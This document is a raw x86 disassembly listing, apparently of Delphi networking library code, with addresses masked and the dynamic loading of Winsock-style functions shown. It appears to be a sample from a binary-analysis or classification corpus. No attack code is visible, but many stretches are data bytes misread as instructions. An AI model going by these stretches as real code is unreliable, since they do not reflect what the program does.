mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x8
bound edi [ ecx + 0x61 ]
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_4698e3
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
sub_46995a
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x8
sub_4699ce
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x8
sub_4699f7
dec [ 0x67000000 ]
je r-xdata
jo r-xdata
jb r-xdata
add [ edx + rw-data ] bh
outsd
je r-xdata
jns r-xdata
bound edi [ ecx + 0x6e ]
popad
insd
add [ gs : eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
bound edi [ ecx + 0x6e ]
mov eax r-xdata
call sub_4692e4
call [ rw-data ]
retn
dec eax
add ecx [ ebx ]
popad
insd
add [ gs : eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_469ad3
dec [ edi ]
add [ eax ] al
add [ edi + 0x53 ] dl
inc ecx
inc edi
je r-xdata
dec ebx
add bl al
add [ eax ] al
popad
jae r-xdata
dec ebx
inc ebp
jb r-xdata
add [ eax + r-xdata ] bh
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
outsd
jb r-xdata
mov edx rw-data
mov eax r-xdata
call sub_4692e4
call [ rw-data ]
retn
sub_469b33
call [ 0x57000000 ]
push ebx
inc ecx
push ebp
outsb
push 0x426b6f6f
insb
outsd
arpl [ ebx + 0x69 ] bp
outsb
dec eax
outsd
outsd
imul eax [ eax ] 0x0
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_469ba7
call [ 0x57000000 ]
push ebx
inc ecx
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
insb
outsd
arpl [ ebx + 0x69 ] bp
outsb
inc ebx
popad
insb
insb
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x18
sub_469c16
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x18
sub_469c4f
call [ 0x57000000 ]
push ebx
inc ecx
inc ecx
jae r-xdata
inc ebp
adc al 0x50
outsb
arpl [ edi + 0x65 ] ax
je r-xdata
outsd
inc edx
jns r-xdata
jb r-xdata
jns r-xdata
mov eax [ ebp + 0x10 ]
popad
insd
add [ gs : eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push eax
mov eax [ ebp + 0xc ]
inc edx
jns r-xdata
jae r-xdata
jne r-xdata
dec esi
outsd
jb r-xdata
inc ebp
or [ eax - 0x1 ] dl
adc eax rw-data
inc edx
jns r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x1c
bound esp [ ebp + 0x72 ]
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x14
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x14
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x14
inc edi
je r-xdata
popad
insd
add [ gs : eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x20 ]
push eax
je r-xdata
outsd
jae r-xdata
add [ eax ] al
push ebp
mov ebp esp
add bh bh
inc edx
jns r-xdata
jae r-xdata
jb r-xdata
pop edi
push edi
push ebx
inc ecx
inc esi
inc esp
dec ecx
jae r-xdata
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x10
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
pop ebp
retn 0x4
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
in al 0x9e
inc esi
add al ch
push ss
hlt
je r-xdata
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x14
sub_46afe4
mov [ rw-data ] sub_469388
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_469458
mov [ rw-data ] sub_469490
mov [ rw-data ] sub_4694cc
mov [ rw-data ] sub_469508
mov [ rw-data ] sub_469544
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_469ab8
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
retn
sub_46b428
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push 0x10
push rw-data
push 0xc8000006
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
or eax 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push ebx
call [ ebp - 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46b47c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46b549
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_40ada8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46920c
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b550
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_46b588
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
call [ rw-data ]
cmp eax 0x1
sbb eax eax
inc eax
pop esi
pop ebx
retn
sub_46b5c0
push ebx
push esi
mov ebx eax
mov eax 0xc
call sub_46b5a8
mov esi eax
add esi ebx
jae r-xdata
sub esi 0x1
jae r-xdata
call sub_403e34
mov eax 0xc
call sub_46b5a8
sub eax 0x1
jae r-xdata
call sub_403e34
not eax
and esi eax
mov eax esi
pop esi
pop ebx
retn
call sub_403e34
sub_46b628
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov edi ebx
mov eax [ edi ]
call sub_46b5c0
add eax ebx
jae r-xdata
mov eax esi
call sub_46b618
jmp r-xdata
add eax 0xc
jae r-xdata
call sub_403e34
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x14 ]
add edx [ esi + 0x10 ]
jae r-xdata
call sub_403e34
cmp eax edx
jbe r-xdata
call sub_403e34
mov eax [ edi ]
call sub_46b5c0
add eax ebx
jae r-xdata
xor eax eax
jmp r-xdata
call sub_403e34
sub_46b6b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b6d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b6e0
retn
sub_46b6e4
push ebx
mov edx eax
cmp edx 0xb
ja r-xdata
mov ebx eax
jmp [ edx * 4 + jump_table_46b6f7 ]
xor ebx ebx
jmp r-xdata
mov ebx 0x2afa
jmp r-xdata
mov ebx 0x2726
jmp r-xdata
mov ebx 0x2afb
jmp r-xdata
mov ebx 0x273f
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x2afc
jmp r-xdata
mov ebx 0x2af9
jmp r-xdata
mov ebx 0x277d
jmp r-xdata
mov ebx 0x273c
jmp r-xdata
xor ebx ebx
call sub_40f32c
jmp r-xdata
mov eax ebx
pop ebx
retn
sub_46b77c
push 0x0
push rw-data
call InterlockedExchange
test eax eax
jns r-xdata
test eax eax
je r-xdata
call sub_403e2c
retn
mov [ rw-data ] 0x0
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_46b7b8
mov [ rw-data ] 0x0
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_46b77c
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
sub_46b879
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46b8a8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b8af
retn
call sub_46b77c
sub_46b8b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx + 0x100046 ] bh
add [ eax ] al
in al dx
0x41ac0046 0x40
sub_46b8e4
mov eax 0xbc004041
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
lodsb [ esi ]
test [ esi ] 0x6449450d
dec esi
outsd
je r-xdata
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax * 8 + 0x32900046 ] ch
inc eax
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
push sub_46b8af
retn
shl [ ecx + edi * 4 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xba
inc esi
add [ eax ] dl
add [ eax ] al
add al bl
jmp r-xdata
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
mov ah 0xf8
inc esi
add [ eax - 0x4bffbfce ] dl
mov edi 0x32900046
inc eax
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
hlt
sub_46b985
les eax [ esi ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
mov ah 0xf8
inc esi
add [ eax - 0x4bffbfce ] dl
mov edi 0x32900046
inc eax
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
hlt
sub_46bab0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov edx 0xc0046
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc eax 0x49644945
outsb
jbe r-xdata
inc ebp
dec ecx
push ebx
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
dec esi
popad
insd
mov eax eax
pushad
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebx 0xc0046
add [ eax ] al
dec esp
mov edx 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al 0x45
push esp
aas
inc eax
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
pop ss
inc ebp
dec ecx
dec ecx
push eax
push esi
jb r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
jpe r-xdata
add ah bl
xor [ esi ] eax
pop ss
inc ebp
dec ecx
push ebx
je r-xdata
outsd
outsb
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xd000408d
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xbb
inc esi
add [ eax + eax ] cl
add [ eax ] al
dec esp
mov edx 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
imul ebp [ edi + 0x6e ] 0x75736e55
push esp
aas
inc eax
add ah bl
xor [ esi ] eax
imul edi [ edx + 0x65 ] 0x65637845
cmp [ fs : esi + eax * 2 ] bh
push ebp
inc ebp
js r-xdata
mov ebp 0x558b0046
clc
outsd
jb r-xdata
movzx edx [ edx + 0x2 ]
lea ecx [ ebp - 0x14 ]
mov eax [ r-xdata ]
mov edx [ ebp - 0x8 ]
jo r-xdata
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 ] bh
inc esi
add [ eax + eax ] cl
add [ eax ] al
dec esp
mov edx 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
cmp [ fs : esi + eax * 2 ] bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bd95
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404e68
retn
call sub_4625b0
push [ ebp - 0x14 ]
push r-xdata
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x3 ]
lea ecx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x18 ]
mov eax esi
mov edx 0x7
call sub_4051e4
jmp r-xdata
mov dh 0x52
add cl [ ebp - 0x4f5e13b3 ]
xor al [ esi ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46bd8e
push [ fs : eax ]
mov [ fs : eax ] esp
sub cl 0x1
jb r-xdata
mov edx [ ebp - 0x8 ]
movzx edx [ edx ]
lea ecx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0xc ]
push r-xdata
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x1 ]
lea ecx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x10 ]
push r-xdata
je r-xdata
mov eax esi
call sub_404e44
mov edi 0x8
mov ebx [ ebp - 0x8 ]
jmp r-xdata
push [ esi ]
lea eax [ ebp - 0x1c ]
push eax
movzx edx [ ebx ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
movzx edx ax
mov ecx 0x1
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x1c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4051e4
add ebx 0x2
dec edi
jne r-xdata
mov eax [ esi ]
call sub_405120
mov edx eax
sub edx 0x1
jno r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c49c
mov eax esi
call sub_4055ac
jmp r-xdata
call sub_403e34
sub_46bc54
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46bd8e
push [ fs : eax ]
mov [ fs : eax ] esp
sub cl 0x1
jb r-xdata
mov edx [ ebp - 0x8 ]
movzx edx [ edx ]
lea ecx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0xc ]
push r-xdata
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x1 ]
lea ecx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x10 ]
push r-xdata
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x2 ]
lea ecx [ ebp - 0x14 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x14 ]
push r-xdata
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x3 ]
lea ecx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x18 ]
mov eax esi
mov edx 0x7
call sub_4051e4
jmp r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bd95
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404e68
retn
mov eax esi
call sub_404e44
mov edi 0x8
mov ebx [ ebp - 0x8 ]
jmp r-xdata
push [ esi ]
lea eax [ ebp - 0x1c ]
push eax
movzx edx [ ebx ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
movzx edx ax
mov ecx 0x1
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x1c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4051e4
add ebx 0x2
dec edi
jne r-xdata
mov eax [ esi ]
call sub_405120
mov edx eax
sub edx 0x1
jno r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c49c
mov eax esi
call sub_4055ac
jmp r-xdata
call sub_403e34
sub_46bdb8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_46bf09
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462614
cmp eax 0xff
jbe r-xdata
je r-xdata
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462614
cmp eax 0xff
jbe r-xdata
call sub_403e2c
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_4644dc
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x24 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x44 ]
lea esi [ ebp - 0x24 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_462614
cmp eax 0xff
jbe r-xdata
call sub_403e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf10
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404e68
retn
mov eax esi
call sub_46c49c
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x14 ]
mov eax [ r-xdata ]
call sub_462614
cmp eax 0xff
jbe r-xdata
call sub_403e2c
mov [ ebx + 0x3 ] al
jmp r-xdata
call sub_403e2c
sub_46bf54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0xc ] eax
inc edx
jne r-xdata
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov edx eax
mov eax esi
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_46bff4
inc eax
xor ecx ecx
call sub_403e2c
cmp ecx esi
jle r-xdata
mov ebx [ ebp - 0x8 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
inc ecx
dec eax
jne r-xdata
mov [ ebp - 0xc ] edx
jmp r-xdata
test ecx ecx
jl r-xdata
sub_46bfb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp + 0x8 ]
